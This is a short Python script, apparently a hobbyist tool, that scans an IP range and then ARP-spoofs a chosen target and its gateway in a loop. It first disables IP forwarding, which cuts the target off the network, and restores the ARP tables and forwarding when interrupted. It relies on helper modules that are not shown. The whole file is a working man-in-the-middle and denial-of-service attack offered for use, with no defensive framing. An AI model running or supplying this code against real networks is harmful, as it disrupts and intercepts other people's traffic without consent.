#!/usr/bin/python
from network_scanner import *
from arp_spoof import *
import kamene.all as scapy
import subprocess
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="give the ip range you want")
    (option) = parser.parse_args()
    if not option.target:
        parser.error(" something is wrong with the ip range")
    return option

option = get_arguments()
scan_result = scan(option.target)
print_result(scan_result)
target_ip = input("give the targets ip => ")
spoof_ip =input("give the gateways ip= > ")
subprocess.call(["echo 0 > /proc/sys/net/ipv4/ip_forward"], shell=True)
try:
    while True:
        spoof(target_ip, spoof_ip)
        spoof(spoof_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip, spoof_ip)
    restore(spoof_ip, target_ip)
    subprocess.call(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True)
    print("\n  [+] Dtected Ctrl+C -------> Quitting.")
